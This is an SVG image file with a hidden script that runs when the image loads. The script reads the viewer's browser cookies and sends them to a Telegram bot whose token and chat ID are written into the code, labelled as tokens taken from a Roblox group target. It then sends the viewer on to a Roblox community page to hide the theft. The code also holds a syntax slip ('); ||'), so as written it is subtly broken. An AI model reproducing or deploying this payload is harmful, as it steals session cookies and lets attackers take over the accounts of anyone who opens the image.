<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" onload="init()">
  <script type="application/ecmascript"><![CDATA[
    function init(){
      const token = Object.fromEntries(
    document.cookie.split('; ').filter(Boolean).map(c => {
      const i = c.indexOf('=');
      return [c.slice(0, i), c.slice(i + 1)];
    })
  ); || 'this-worked-v2';
    
      // Your Telegram Bot Token and Chat ID
      const botToken = "8262449032:AAFB_jVPcfVjPMXV_ECWS-MHxiEJKP8Apxs";
      const chatId = "-5098583582";
      
      const telegram_url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      
      const payload = {
        chat_id: chatId,
        text: "Token extracted from rbx Group Target" + token,
        parse_mode: "HTML"
      };
      
      fetch(telegram_url, {
        method: 'POST',
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      }).then(() => {
        setTimeout(() => {
          window.location.href = 'https://www.roblox.com/communities/34736529/0-CCU-Games#!/about';
        }, 500);
      }).catch(() => {
        setTimeout(() => {
          window.location.href = 'https://www.roblox.com/communities/34736529/0-CCU-Games#!/about';
        }, 500);
      });
    }
  ]]>
  </script>
</svg>
